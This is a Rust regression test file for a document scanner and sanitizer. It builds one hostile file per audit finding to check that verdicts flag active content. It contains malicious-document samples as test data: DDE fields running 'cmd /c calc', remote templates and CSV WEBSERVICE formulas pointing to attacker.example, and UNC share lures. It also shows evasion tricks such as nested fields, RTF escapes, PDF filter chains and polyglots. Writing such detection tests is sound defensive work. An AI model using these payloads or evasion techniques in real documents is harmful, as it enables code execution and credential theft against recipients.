//! Regression tests for the audit findings B1–B13: one hostile file per finding, built here.
//!
//! The rule under test is the one the verdict stands on: `Clean` only if everything was
//! verified. A file that hides active content must say `ActiveContentNeutralized`; a file the
//! scanner could not read, or read in a way another reader might not, must not say `Clean`.

use arca_container::InflateBudget;
use arca_container::zip::{ZipArchive, ZipLimits};

use super::builders::*;
use super::fixtures::*;
use crate::report::{ThreatKind as K, Verdict, XRayReport};
use crate::sanitize::{SanitizeOptions, sanitize};
use crate::{ScanPolicy, scan, scan_default};

const MDB: &[u8] = include_bytes!("../../../../tests/fixtures/access-2000.mdb");

#[track_caller]
fn assert_active(r: &XRayReport, kind: K) {
    assert!(r.has(kind), "expected {kind:?}; got {:#?}", r.findings);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized, "{:#?}", r.findings);
}

#[track_caller]
fn assert_unverified(r: &XRayReport, kind: K) {
    assert!(r.has(kind), "expected {kind:?}; got {:#?}", r.findings);
    assert_eq!(r.verdict, Verdict::Unverified, "{:#?}", r.findings);
}

#[track_caller]
fn assert_rejected(r: &XRayReport) {
    assert_eq!(r.verdict, Verdict::Rejected, "{:#?}", r.findings);
}

/// The text of member `name` of the archive `bytes`.
fn part(bytes: &[u8], name: &str) -> Option<String> {
    let zip = ZipArchive::parse(bytes, ZipLimits::default()).ok()?;
    let mut budget = InflateBudget::new(64 << 20, 1000, 16 << 20);
    let data = zip.read_by_name(name, &mut budget).ok()??;
    Some(String::from_utf8_lossy(&data).into_owned())
}

fn sanitized(
    bytes: &[u8],
) -> Result<crate::sanitize::SanitizedDocument, crate::sanitize::SanitizeError> {
    sanitize(bytes, &ScanPolicy::default(), &SanitizeOptions::default())
}

// ---- B1: Access ---------------------------------------------------------------------------------

#[test]
fn b1_object_names_are_found_whatever_their_case() {
    let d = arca_container::jet::database_with_objects(1, &[(-32766, "aUtOeXeC")]);
    assert!(scan_default(&d).has(K::MacroAutoExec));
    let d = arca_container::jet::database_with_objects(1, &[(5, "vbaPROJECT")]);
    assert!(scan_default(&d).has(K::VbaMacros));
    let d = arca_container::jet::database_with_objects(1, &[(-32761, "Module1")]);
    assert!(scan_default(&d).has(K::VbaMacros));
    // The same words in a damaged database are found as bytes, in both encodings.
    let mut d = MDB.to_vec();
    d[2 * 4096..3 * 4096].fill(0);
    d.extend_from_slice(b"aUtOeXeC");
    assert!(scan_default(&d).has(K::MacroAutoExec));
    let mut d = MDB.to_vec();
    d[2 * 4096..3 * 4096].fill(0);
    d.extend("vbaPROJECT".encode_utf16().flat_map(u16::to_le_bytes));
    assert!(scan_default(&d).has(K::VbaMacros));
}

#[test]
fn b1_an_ole_storage_inside_a_database_is_scanned() {
    let mut d = MDB.to_vec();
    d.extend_from_slice(&doc_binary());
    let r = scan_default(&d);
    assert_active(&r, K::ExploitableOleClass);
}

// ---- B2: the role of a part comes from its type, not its name ---------------------------------

#[test]
fn b2_a_renamed_main_part_is_still_scanned() {
    // Names that office software gives a meaning to: the content type wins, and the clash is
    // reported.
    for name in [
        "word/embeddings/main.xml",
        "word/activeX/main.xml",
        "customXml/main.xml",
        "word/customUI/main.xml",
        "word/externalLinks/main.xml",
        "word/people.xml",
        "word/comments.xml",
        "word/printerSettings/main.xml",
        "docProps/thumbnail.xml",
        "word/macrosheets/main.xml",
    ] {
        let r = scan_default(&docx_main_part_named(name, &dde_body()).build());
        assert_active(&r, K::DdeField);
        assert!(r.has(K::ContentTypeMismatch), "{name}: {:#?}", r.findings);
    }
    // A name that merely contains a word is no reason to skip a main part.
    let r = scan_default(&docx_main_part_named("word/mycomments.xml", &dde_body()).build());
    assert_active(&r, K::DdeField);
}

#[test]
fn b2_a_part_named_like_something_else_is_a_coverage_gap_even_when_benign() {
    let r = scan_default(&docx_main_part_named("word/embeddings/main.xml", &para("hello")).build());
    assert_unverified(&r, K::ContentTypeMismatch);
}

#[test]
fn b2_a_part_declared_as_relationships_but_not_named_like_them_is_a_gap() {
    let mut o = docx();
    o.set("word/header1.xml", document(&dde_body())).set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            ("/word/header1.xml", "application/vnd.openxmlformats-package.relationships+xml"),
        ]),
    );
    assert_unverified(&scan_default(&o.build()), K::ContentTypeMismatch);
}

#[test]
fn b2_the_sanitizer_decides_by_the_same_rules() {
    // Before the fix the main part was dropped as a "comments" part and the check that followed
    // asked the same question, so the copy "verified". Now the DDE field is neutralised in it...
    let bytes = docx_main_part_named("word/mycomments.xml", &dde_body()).build();
    let out = sanitized(&bytes).expect("sanitized");
    let xml = part(&out.bytes, "word/mycomments.xml").expect("the main part is kept");
    assert!(!xml.contains("DDEAUTO"), "{xml}");
    assert_ne!(out.verification.verdict, Verdict::ActiveContentNeutralized);
    // ... and a part the sources disagree about is refused.
    let bytes = docx_main_part_named("word/embeddings/main.xml", &dde_body()).build();
    assert!(sanitized(&bytes).is_err());
}

#[test]
fn b2_the_sanitizer_sees_what_the_scanner_sees() {
    let mut o = docx_body(&dde_body());
    // Same part, now also listed twice with different types.
    o.set(
        "[Content_Types].xml",
        content_types(&[("/word/document.xml", CT_DOCX), ("/word/document.xml", CT_DOCM)]),
    );
    let r = scan_default(&o.build());
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
}

// ---- B3: format confusion in compound files ------------------------------------------------------

fn word_stub() -> Vec<u8> {
    let mut w = vec![0u8; 0x400];
    w[0..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
    w
}

#[test]
fn b3_a_compound_file_that_is_two_documents_is_scanned_as_both() {
    let book = biff_workbook(&[biff_sheet(0x01, "Macro1")]);
    let r = scan_default(&cfb_with(&[("WordDocument", word_stub()), ("Workbook", book)]));
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
    // The Excel half is scanned although the file is identified as Word.
    assert_active(&r, K::XlmMacroSheet);
}

#[test]
fn b3_several_document_types_alone_are_enough_to_refuse_a_clean_verdict() {
    let book = biff_workbook(&[biff_sheet(0x00, "Sheet1")]);
    let r = scan_default(&cfb_with(&[
        ("WordDocument", word_stub()),
        ("Workbook", book),
        ("PowerPoint Document", vec![0u8; 16]),
    ]));
    assert_ne!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
    assert!(r.has(K::ParserDifferential));
}

// ---- B4: attributes with the same name under another prefix --------------------------------------

#[test]
fn b4_a_foreign_prefixed_instr_next_to_the_real_one_is_not_ignored() {
    let body = r#"<w:p><w:fldSimple w:instr=" PAGE " x:instr="DDEAUTO cmd &quot;/c calc&quot;" xmlns:x="urn:x"><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p>"#;
    let r = scan_default(&docx_body(body).build());
    assert_active(&r, K::DdeField);
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
}

#[test]
fn b4_a_benign_prefixed_target_does_not_hide_the_real_one() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        format!(
            r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships" xmlns:a="urn:a"><Relationship Id="rId1" Type="{R_NS}/attachedTemplate" a:Target="media/x.dotm" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>"#
        ),
    );
    let r = scan_default(&o.build());
    assert_active(&r, K::RemoteTemplate);
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
}

#[test]
fn b4_a_prefixed_target_mode_cannot_hide_that_a_reference_is_external() {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        format!(
            r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships" xmlns:a="urn:a"><Relationship Id="rId1" Type="{R_NS}/image" Target="https://t.example/p.gif" a:TargetMode="External" TargetMode="Internal"/></Relationships>"#
        ),
    );
    let r = scan_default(&o.build());
    assert!(r.has(K::ExternalImage), "{:#?}", r.findings);
}

#[test]
fn b4_opendocument_may_repeat_a_local_name_under_two_prefixes() {
    let body = r#"<draw:frame draw:style-name="a" presentation:style-name="b"/>"#;
    let r = scan_default(&odf_zip(&[("content.xml", &odf_content(body))]));
    assert!(!r.has(K::ParserDifferential), "{:#?}", r.findings);
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

// ---- B5: nested fields supply the keyword -------------------------------------------------------

#[test]
fn b5_a_quote_with_a_quoted_string_supplies_the_dde_keyword() {
    let r = scan_default(
        &docx_body(&nested_field("", "QUOTE \"DDEAUTO\"", " cmd \"/c calc\" ")).build(),
    );
    assert_active(&r, K::DdeField);
}

#[test]
fn b5_a_quote_split_across_the_keyword_is_joined() {
    let r = scan_default(&docx_body(&nested_field(" DD", "QUOTE \"EAUTO\"", " cmd ")).build());
    assert_active(&r, K::DdeField);
}

#[test]
fn b5_other_nested_fields_in_keyword_position_are_dde_until_proven_otherwise() {
    for inner in ["REF kw \\h", "DOCVARIABLE kw", "SET kw \"DDEAUTO\"", "IF 1 = 1 \"DDEAUTO\" \"\""]
    {
        let r = scan_default(&docx_body(&nested_field("", inner, " cmd \"/c calc\" ")).build());
        assert_active(&r, K::DdeField);
        assert!(
            r.of_kind(K::DdeField).any(|f| f.detail.contains("nested field")),
            "{inner}: {:#?}",
            r.findings
        );
    }
}

#[test]
fn b5_a_nested_field_in_an_argument_position_is_harmless() {
    let r = scan_default(&docx_body(&nested_field(" IF ", "PAGE", " > 1 \"a\" \"b\" ")).build());
    assert!(!r.has(K::DdeField), "{:#?}", r.findings);
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b5_binary_word_fields_that_straddle_two_pieces_are_found() {
    let doc = doc_with_pieces(&[b"text \x13 DD", b"EAUTO cmd \"/c calc\" \x14result\x15"], "");
    let r = scan_default(&doc);
    assert_active(&r, K::DdeField);
}

#[test]
fn b5_binary_word_nested_quote_is_joined() {
    let text: &[&[u8]] = &[b"\x13\x13QUOTE \"DDEAUTO\"\x14x\x15 cmd\x14r\x15"];
    let r = scan_default(&doc_with_pieces(text, ""));
    assert_active(&r, K::DdeField);
}

#[test]
fn b5_binary_word_without_a_readable_piece_table_is_unverified() {
    // A FIB without the table of file offsets, and a table stream with nothing in it.
    let r = scan_default(&cfb_with(&[("WordDocument", word_stub()), ("1Table", vec![0u8; 8])]));
    assert_unverified(&r, K::ScanLimitReached);
}

#[test]
fn b5_the_sanitizer_neutralises_what_the_scanner_calls_dde() {
    for body in [
        nested_field("", "QUOTE \"DDEAUTO\"", " cmd \"/c calc\" "),
        nested_field("", "REF kw", " cmd "),
        nested_field(" DD", "QUOTE 69 65 85 84 79", " cmd "),
    ] {
        let out = sanitized(&docx_body(&body).build()).expect("sanitized");
        assert_ne!(out.verification.verdict, Verdict::ActiveContentNeutralized);
        let xml = part(&out.bytes, "word/document.xml").unwrap();
        assert!(!xml.contains("DDEAUTO") && !xml.contains("instrText"), "{xml}");
    }
}

// ---- B6: RTF ------------------------------------------------------------------------------------

#[test]
fn b6_a_nested_fldinst_does_not_replace_the_outer_one() {
    let body = r#"{\field{\*\fldinst {DDEAUTO cmd }{\field{\*\fldinst PAGE}{\fldrslt 1}}{ "/c calc"}}{\fldrslt x}}"#;
    assert_active(&scan_default(&rtf(body)), K::DdeField);
}

#[test]
fn b6_a_nested_quote_supplies_the_keyword() {
    let body = r#"{\field{\*\fldinst {\field{\*\fldinst QUOTE 68 68 69 65 85 84 79}{\fldrslt x}} cmd "/c calc"}{\fldrslt}}"#;
    assert_active(&scan_default(&rtf(body)), K::DdeField);
}

#[test]
fn b6_the_cached_result_of_a_nested_field_is_not_part_of_the_instruction() {
    // The result says "DDEAUTO", the instruction is harmless: nothing to report.
    let body = r#"{\field{\*\fldinst IF {\field{\*\fldinst PAGE}{\fldrslt DDEAUTO}} > 1 a b}{\fldrslt 1}}"#;
    let r = scan_default(&rtf(body));
    assert!(!r.has(K::DdeField), "{:#?}", r.findings);
}

#[test]
fn b6_uc0_means_the_character_after_u_is_text() {
    let body = r#"{\field{\*\fldinst \uc0\u68DEAUTO cmd "/c calc"}{\fldrslt x}}"#;
    assert_active(&scan_default(&rtf(body)), K::DdeField);
}

#[test]
fn b6_uc_is_scoped_to_its_group() {
    // `\uc0` inside the inner group ends with it: after it `\u68` swallows one character again.
    let body = r#"{\field{\*\fldinst {\uc0 }\u68?DEAUTO cmd "/c calc"}{\fldrslt x}}"#;
    assert_active(&scan_default(&rtf(body)), K::DdeField);
}

// ---- B7: PDF ------------------------------------------------------------------------------------

#[test]
fn b7_a_nested_decodeparms_dictionary_does_not_hide_the_filter() {
    let obj = stream_object(
        "/Filter /FlateDecode /DecodeParms << /Predictor 1 /Columns 1 >>",
        &zlib(JS_ACTION),
    );
    assert_active(&scan_default(&pdf_with(&obj)), K::PdfJavaScript);
}

#[test]
fn b7_filter_chains_are_decoded() {
    let flate = zlib(JS_ACTION);
    let cases: Vec<(&str, Vec<u8>)> = vec![
        ("/Filter [/ASCIIHexDecode /FlateDecode]", hex_encode(&flate)),
        ("/Filter [/ASCII85Decode /FlateDecode]", ascii85(&flate)),
        ("/Filter [/RunLengthDecode /FlateDecode]", run_length(&flate)),
        ("/Filter /ASCIIHexDecode", hex_encode(JS_ACTION)),
        ("/Filter /ASCII85Decode", ascii85(JS_ACTION)),
        ("/Filter /RunLengthDecode", run_length(JS_ACTION)),
        ("/Filter /LZWDecode", lzw_literals(JS_ACTION)),
        ("/Filter [/AHx /Fl]", hex_encode(&flate)),
    ];
    for (dict, data) in cases {
        let r = scan_default(&pdf_with(&stream_object(dict, &data)));
        assert!(r.has(K::PdfJavaScript), "{dict}: {:#?}", r.findings);
        assert_eq!(r.verdict, Verdict::ActiveContentNeutralized, "{dict}");
    }
}

#[test]
fn b7_a_png_predictor_is_undone() {
    // One column, no filtering: every byte is preceded by a filter-type byte of 0.
    let rows: Vec<u8> = JS_ACTION.iter().flat_map(|&b| [0, b]).collect();
    let obj = stream_object(
        "/Filter /FlateDecode /DecodeParms << /Predictor 15 /Columns 1 >>",
        &zlib(&rows),
    );
    assert_active(&scan_default(&pdf_with(&obj)), K::PdfJavaScript);
}

#[test]
fn b7_nul_is_white_space_between_tokens() {
    let obj = b"4 0 obj << /Type /Action /S /JavaScript\0/JS (app.alert\\(1\\)) >> endobj\n";
    assert_active(&scan_default(&pdf_with(obj)), K::PdfJavaScript);
}

#[test]
fn b7_a_lying_length_shows_both_readings() {
    // `endstream` appears inside the data; /Length covers the real end.
    let mut payload = b"endstream ".to_vec();
    payload.extend_from_slice(JS_ACTION);
    let obj = stream_object("/Filter /RunLengthDecode", &run_length(&payload));
    let r = scan_default(&pdf_with(&obj));
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
    assert_active(&r, K::PdfJavaScript);
}

#[test]
fn b7_an_indirect_length_is_resolved() {
    let mut payload = b"endstream ".to_vec();
    payload.extend_from_slice(JS_ACTION);
    let data = run_length(&payload);
    let mut obj = b"3 0 obj << /Filter /RunLengthDecode /Length 9 0 R >>\nstream\n".to_vec();
    obj.extend_from_slice(&data);
    obj.extend_from_slice(
        format!("\nendstream\nendobj\n9 0 obj {} endobj\n", data.len()).as_bytes(),
    );
    let r = scan_default(&pdf_with(&obj));
    assert_active(&r, K::PdfJavaScript);
}

#[test]
fn b7_a_filter_that_is_not_decoded_is_a_coverage_gap() {
    for dict in
        ["/Filter /FooDecode", "/Filter /Crypt", "/Filter [/FlateDecode /Foo]", "/Filter 9 0 R"]
    {
        let r = scan_default(&pdf_with(&stream_object(dict, b"opaque")));
        assert_unverified(&r, K::ScanLimitReached);
    }
}

#[test]
fn b7_a_stream_without_a_parsable_dictionary_is_a_coverage_gap() {
    let obj = b"3 0 obj [1 2 3] stream\nopaque\nendstream endobj\n";
    assert_unverified(&scan_default(&pdf_with(obj)), K::ScanLimitReached);
}

#[test]
fn b7_picture_filters_are_not_text() {
    let obj = stream_object("/Subtype /Image /Filter /DCTDecode", b"\xFF\xD8\xFF\xE0 opaque");
    let r = scan_default(&pdf_with(&obj));
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b7_a_benign_flate_stream_stays_clean() {
    let obj = stream_object("/Filter /FlateDecode", &zlib(b"BT /F1 12 Tf (hello) Tj ET"));
    let r = scan_default(&pdf_with(&obj));
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b7_overlapping_streams_cannot_multiply_the_work() {
    // Every stream claims a length that reaches the last `endstream` of the file, so decoding
    // every extent in full would cost (streams x file size).
    let mut pdf = b"%PDF-1.7\n".to_vec();
    let mut length_slots = Vec::new();
    let mut data_starts = Vec::new();
    for i in 0..400 {
        pdf.extend_from_slice(
            format!("{} 0 obj << /Filter /ASCIIHexDecode /Length ", i + 10).as_bytes(),
        );
        length_slots.push(pdf.len());
        pdf.extend_from_slice(b"00000000 >>\nstream\n");
        data_starts.push(pdf.len());
        pdf.extend_from_slice(&[b'0'; 600]);
        pdf.extend_from_slice(b"\nendstream endobj\n");
    }
    let last_end = pdf.windows(9).rposition(|w| w == b"endstream").unwrap();
    for (slot, start) in length_slots.iter().zip(&data_starts) {
        let n = format!("{:08}", last_end - start);
        pdf[*slot..*slot + 8].copy_from_slice(n.as_bytes());
    }
    pdf.extend_from_slice(b"trailer << /Root 1 0 R >>\n%%EOF\n");
    let start = std::time::Instant::now();
    let r = scan_default(&pdf);
    assert!(start.elapsed() < std::time::Duration::from_secs(20), "took {:?}", start.elapsed());
    assert!(r.has(K::ParserDifferential), "{:#?}", r.findings);
    assert_ne!(r.verdict, Verdict::Clean);
}

// ---- B8: text and flat XML ------------------------------------------------------------------------

fn strip_prolog(xml: &str) -> &str {
    xml.split_once("?>").map_or(xml, |(_, rest)| rest)
}

fn flat_opc(parts: &str) -> Vec<u8> {
    format!(
        r#"<?xml version="1.0" standalone="yes"?><pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">{parts}</pkg:package>"#
    )
    .into_bytes()
}

#[test]
fn b8_flat_opc_is_scanned_part_by_part() {
    let doc = document(&dde_body());
    let part = format!(
        r#"<pkg:part pkg:name="/word/document.xml" pkg:contentType="{CT_DOCX}"><pkg:xmlData>{}</pkg:xmlData></pkg:part>"#,
        strip_prolog(&doc)
    );
    assert_active(&scan_default(&flat_opc(&part)), K::DdeField);
}

#[test]
fn b8_flat_opc_relationships_are_inspected() {
    let rels_part = format!(
        r#"<pkg:part pkg:name="/word/_rels/settings.xml.rels"><pkg:xmlData><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{R_NS}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships></pkg:xmlData></pkg:part>"#
    );
    assert_active(&scan_default(&flat_opc(&rels_part)), K::RemoteTemplate);
}

#[test]
fn b8_flat_opc_binary_parts_are_decoded_and_scanned() {
    let blob = base64(&docm_with_macro().build());
    let part = format!(
        r#"<pkg:part pkg:name="/word/embeddings/x.docm" pkg:contentType="application/vnd.ms-word.document.macroEnabled.12"><pkg:binaryData>{blob}</pkg:binaryData></pkg:part>"#
    );
    assert_active(&scan_default(&flat_opc(&part)), K::VbaMacros);
}

#[test]
fn b8_word_2003_xml_fields_are_scanned() {
    let xml = r#"<?xml version="1.0"?><w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml"><w:body><w:p><w:fldSimple w:instr="DDEAUTO cmd"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body></w:wordDocument>"#;
    assert_active(&scan_default(xml.as_bytes()), K::DdeField);
}

#[test]
fn b8_excel_2003_xml_formulas_are_scanned() {
    let xml = r#"<?xml version="1.0"?><Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet" xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet"><Worksheet ss:Name="a"><Table><Row><Cell ss:Formula="=cmd|' /c calc'!A0"><Data ss:Type="Number">1</Data></Cell></Row></Table></Worksheet></Workbook>"#;
    assert_active(&scan_default(xml.as_bytes()), K::DdeFormula);
}

#[test]
fn b8_flat_opendocument_scripts_are_found() {
    let xml = r#"<?xml version="1.0"?><office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink"><office:body><office:text><text:p><script:event-listener script:event-name="dom:click" xlink:href="vnd.sun.star.script:Lib.Mod.Main?language=Basic"/></text:p></office:text></office:body></office:document>"#;
    assert_active(&scan_default(xml.as_bytes()), K::OdfEventScript);
}

#[test]
fn b8_an_svg_document_is_scanned() {
    let xml = r#"<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>"#;
    assert_active(&scan_default(xml.as_bytes()), K::HtmlActiveContent);
}

#[test]
fn b8_an_xml_document_of_an_unknown_kind_is_not_clean() {
    let r = scan_default(br#"<?xml version="1.0"?><rss version="2.0"><channel/></rss>"#);
    assert_unverified(&r, K::ScanLimitReached);
}

#[test]
fn b8_shortcuts_and_scripts_are_not_documents() {
    let cases: &[(&str, &str)] = &[
        ("url", "[InternetShortcut]\r\nURL=file://attacker/share/x.exe\r\n"),
        ("iqy", "WEB\r\n1\r\nhttp://attacker.example/query\r\n"),
        ("scf", "[Shell]\r\nCommand=2\r\nIconFile=\\\\attacker\\share\\x.ico\r\n"),
        (
            "theme",
            "[Theme]\r\nDisplayName=x\r\n[Control Panel\\Desktop]\r\nWallpaper=\\\\attacker\\s\\w.bmp\r\n",
        ),
        (
            "library-ms",
            r#"<?xml version="1.0"?><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"/>"#,
        ),
        (
            "settingcontent-ms",
            r#"<?xml version="1.0"?><PCSettings><SearchableContent/></PCSettings>"#,
        ),
        (
            "sct",
            r#"<?xml version="1.0"?><scriptlet><script language="JScript">x</script></scriptlet>"#,
        ),
        ("wsf", r#"<job id="x"><script language="VBScript">x</script></job>"#),
        ("jnlp", r#"<?xml version="1.0"?><jnlp codebase="http://attacker.example/"/>"#),
    ];
    for (what, text) in cases {
        let r = scan_default(text.as_bytes());
        assert_rejected(&r);
        assert!(r.has(K::DisguisedExecutable), "{what}: {:#?}", r.findings);
    }
}

#[test]
fn b8_script_code_in_a_text_file_is_active_content() {
    for text in [
        "@echo off\r\ncmd /c calc\r\n",
        "Set o = CreateObject(\"WScript.Shell\")\r\no.Run \"calc\"\r\n",
        "powershell -enc AAAA\r\n",
        "$c = New-Object Net.WebClient\r\n$c.DownloadString('http://x')\r\n",
    ] {
        assert_active(&scan_default(text.as_bytes()), K::EmbeddedScript);
    }
}

#[test]
fn b8_ordinary_prose_is_clean() {
    let r =
        scan_default("Meeting notes\nWe agreed to call the shell company on Monday.\n".as_bytes());
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b8_html_after_the_first_512_characters_is_still_html() {
    let text = format!("{}\n<script>alert(1)</script>\n", "lorem ipsum ".repeat(100));
    assert_active(&scan_default(text.as_bytes()), K::HtmlActiveContent);
}

#[test]
fn b8_markup_handlers_urls_and_redirects_are_found_in_any_text() {
    for text in [
        "# Notes\n<svg onload=alert(1)>\n",
        "plain words\n<img src=x onerror = alert(1)>\n",
        "see <a href=\"java\tscript:alert(1)\">x</a>\n",
        "x\n<meta http-equiv='refresh' content='0;url=http://attacker.example/'>\n",
        "x\n<META HTTP-EQUIV=Refresh CONTENT=0>\n",
        "x\n<IFRAME src=//attacker.example/></IFRAME>\n",
    ] {
        assert_active(&scan_default(text.as_bytes()), K::HtmlActiveContent);
    }
}

#[test]
fn b8_a_comment_does_not_push_the_html_tag_out_of_sight() {
    let text = format!("<!-- {} --><html><body onload=x>", "padding ".repeat(200));
    assert_rejected(&scan_default(text.as_bytes()));
}

#[test]
fn b8_csv_formulas_behind_a_number_are_still_formulas() {
    for cell in [
        "=1+WEBSERVICE(\"http://attacker.example/x\")",
        "-2+IMAGE(\"http://attacker.example/p.png\")",
        "+1|' /C calc'!A0",
        "=0+EXEC(\"calc\")",
    ] {
        let csv = format!("a,b\n1,{cell}\n");
        assert_active(&scan_default(csv.as_bytes()), K::CsvFormulaInjection);
    }
}

#[test]
fn b8_csv_numbers_and_phone_numbers_are_not_formulas() {
    let r = scan_default(b"name,value\nx,-5.3\ny,+1 (555) 010-0100\n");
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b8_csv_quoting_follows_rfc_4180() {
    // The separator inside quotes does not start a new cell; the formula cell after it does.
    let r = scan_default(b"a,b\n\"x,y\",=cmd|' /C calc'!A0\n");
    assert_active(&r, K::CsvFormulaInjection);
}

#[test]
fn b8_sylk_formulas_are_found() {
    let slk = "ID;PWXL;N;E\r\nC;X1;Y1;K\"=cmd|' /C calc'!A0\"\r\nE\r\n";
    assert_active(&scan_default(slk.as_bytes()), K::CsvFormulaInjection);
}

// ---- B9: polyglots and unaccounted bytes ------------------------------------------------------------

#[test]
fn b9_an_archive_that_is_a_package_and_an_opendocument_is_scanned_as_both() {
    let mut o = docx();
    o.set("mimetype", "application/vnd.oasis.opendocument.text")
        .set("META-INF/manifest.xml", "<manifest/>")
        .set(
            "content.xml",
            odf_content(r#"<text:a xlink:href="vnd.sun.star.script:Lib.Mod.Main">x</text:a>"#),
        );
    let r = scan_default(&o.build());
    assert!(r.has(K::PolyglotFile), "{:#?}", r.findings);
    assert_active(&r, K::OdfEventScript);
}

#[test]
fn b9_a_benign_dual_format_archive_is_unverified() {
    let mut o = docx();
    o.set("mimetype", "application/vnd.oasis.opendocument.text")
        .set("META-INF/manifest.xml", "<manifest/>");
    assert_unverified(&scan_default(&o.build()), K::PolyglotFile);
}

#[test]
fn b9_trailing_zero_padding_is_harmless_but_anything_else_is_not() {
    let mut z = docx().build();
    z.extend_from_slice(&[0; 64]);
    let r = scan_default(&z);
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
    assert!(r.of_kind(K::TrailingData).all(|f| f.severity == crate::report::Severity::Info));
    let mut z = docx().build();
    z.extend_from_slice(b"MZ payload");
    assert_unverified(&scan_default(&z), K::TrailingData);
    let mut z = docx().build();
    z.extend_from_slice(&[0, 0, 0, 1]);
    assert_unverified(&scan_default(&z), K::TrailingData);
}

#[test]
fn b9_unreferenced_data_between_members_is_a_gap() {
    let mut z = docx().build();
    super::corpus::insert_gap_before_central_directory(&mut z, 64);
    assert_unverified(&scan_default(&z), K::UnreferencedArchiveData);
}

#[test]
fn b9_a_second_name_for_a_member_is_a_gap() {
    let o = docx();
    let entries: Vec<Raw<'_>> = o
        .entries()
        .iter()
        .map(|(n, d)| {
            let mut e = Raw::new(n, d);
            if n == "word/document.xml" {
                e.central_extra = unicode_path_extra(n, n);
            }
            e
        })
        .collect();
    let r = scan_default(&raw_zip(&entries));
    assert_unverified(&r, K::ParserDifferential);
}

#[test]
fn b9_a_pdf_header_near_the_start_of_an_archive_or_compound_file() {
    let mut o = Opc::default();
    o.set("a%PDF-1.4.bin", "x");
    for (n, d) in docx().entries() {
        o.set(n, d.clone());
    }
    let r = scan_default(&o.build());
    assert!(r.has(K::PolyglotFile), "{:#?}", r.findings);
    assert_ne!(r.verdict, Verdict::Clean);

    let mut big = b"%PDF-1.4\n".to_vec();
    big.resize(6000, b' ');
    let r = scan_default(&cfb_with(&[("Stream", big)]));
    assert!(r.has(K::PolyglotFile), "{:#?}", r.findings);
    assert_ne!(r.verdict, Verdict::Clean);
}

#[test]
fn b9_a_picture_in_a_package_is_checked_for_a_second_format() {
    let gif = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;";
    let mut hostile = gif.to_vec();
    hostile.extend_from_slice(&docx().build());
    let mut o = docx();
    o.set("word/media/image1.png", hostile);
    let r = scan_default(&o.build());
    assert!(r.has(K::PolyglotFile), "{:#?}", r.findings);
    assert_ne!(r.verdict, Verdict::Clean);
}

// ---- B10: blind zones ------------------------------------------------------------------------------

fn docx_with_binary_part(name: &str, content_type: &str, data: Vec<u8>) -> Vec<u8> {
    let mut o = docx();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            (
                "/word/settings.xml",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml",
            ),
            (&format!("/{name}"), content_type),
        ]),
    )
    .set(name, data);
    o.build()
}

#[test]
fn b10_containers_hidden_in_binary_parts_are_scanned() {
    let payloads: Vec<(&str, Vec<u8>)> = vec![
        ("a macro document", docm_with_macro().build()),
        ("a PDF", pdf_with_js()),
        ("a compound file", doc_binary()),
        ("an RTF", rtf_equation_exploit()),
    ];
    for (what, data) in payloads {
        let r = scan_default(&docx_with_binary_part(
            "word/media/payload.dat",
            "application/octet-stream",
            data,
        ));
        assert_eq!(r.verdict, Verdict::ActiveContentNeutralized, "{what}: {:#?}", r.findings);
        assert!(r.has(K::EmbeddedDocument), "{what}");
    }
}

#[test]
fn b10_binary_parts_of_an_unknown_kind_are_a_gap_unless_they_are_plain_media() {
    let junk: Vec<u8> = (0..64u8).map(|i| i.wrapping_mul(37) | 0x80).collect();
    let r = scan_default(&docx_with_binary_part(
        "word/media/payload.dat",
        "application/octet-stream",
        junk.clone(),
    ));
    assert_unverified(&r, K::ScanLimitReached);
    let r = scan_default(&docx_with_binary_part("word/media/image1.emf", "image/x-emf", junk));
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
}

#[test]
fn b10_office_add_ins_are_executable_content() {
    let mut o = docx();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
